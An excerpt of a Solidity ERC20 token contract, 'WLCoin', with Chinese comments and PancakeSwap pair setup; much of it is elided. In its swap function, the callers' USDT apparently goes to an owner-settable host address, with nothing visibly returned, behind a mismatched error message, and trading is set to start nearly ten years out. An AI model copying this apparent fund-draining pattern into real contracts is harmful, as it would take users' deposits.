...
contract WLCoin is ERC20Burnable, Ownable {

    uint256 private _maxSupply = 10000000 * 10 ** 18;//最大发行量
    mapping(address => bool) private _special_list;
    uint256 private _startTime;

    IPancakeRouter02 public _mdx_V2Router02;
    IPancakePair public _mdx_V2Pair;
    address public _WLC_LP_USDT_address;//WLC LP地址
    ...
    constructor(
        ...
        _startTime = block.timestamp + 3560 days;
        _mdx_V2Router02 = IPancakeRouter02(_mdx_Router);
        _WLC_LP_USDT_address = IPancakeFactory(_mdx_V2Router02.factory()).createPair(
            address(this),
            _USDT_address
        );
        _isSwapInclude[_mdx_Router] = true;
        _isSwap_LP_Include[_WLC_LP_USDT_address] = true;
        _mdx_V2Pair = IPancakePair(_WLC_LP_USDT_address);
    ...
    function swap(uint256 amount) external {
        require(IERC20(_USDT_address).balanceOf(msg.sender) >= amount, "The time is not started");
        IERC20(_USDT_address).transferFrom(msg.sender, _host_address, amount);
    ...
    function set_host_address(address _address) external onlyOwner {
